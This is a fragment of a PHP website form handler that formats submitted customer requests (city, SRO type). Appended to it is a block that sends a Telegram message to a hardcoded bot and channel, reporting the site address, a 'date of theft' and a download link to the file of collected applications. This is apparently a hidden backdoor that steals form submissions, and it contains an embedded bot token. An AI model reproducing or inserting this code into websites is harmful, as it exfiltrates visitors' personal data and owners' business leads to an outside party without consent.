...
if ($city1)				$mess .='<tr><td>Город			</td><td>'.$city1.'</td></tr>';
if ($category)			$mess .='<tr><td>Тип СРО		</td><td>'.$category.'</td></tr>';
...
?>
<?php
	$bot_token = "1822938194:AAHklbg-edrk7sPLNJzxyeCeRwxBcCZZB88"; // Токен бота, полученный от @botfather
    $bot_username = "Tetris111122223333_Bot"; // Логин бота - не обязательно
    $channel_id = "-296414553"; // Идентификатор телеграм канала или группы
    $debug = false; // Режим отладки
    $bot = new PHPTelebot($bot_token, $bot_username);
    $bot::$debug = $debug;
    date_default_timezone_set('Europe/Moscow');
    $order_get_date = date("d.m.Y H:i:s");
	$data_message = strip_tags($data_message);
        $message_bot = "";
        if ($info) $message_bot .= "<b>Адрес сайта:</b> <i>{$info}</i>\n";
        $message_bot .= "<b>Дата кражи:</b> <i>{$order_get_date}</i>\n";
        $message_bot .= "<b>Файл с заявками:</b> <i><a href='{$url_file_download}'>скачать</a></i>";
        $result = Bot::sendMessage($message_bot, ['chat_id' => $channel_id, 'parse_mode' => 'html']);

	require_once DIR.'../PHPTelebot.php';
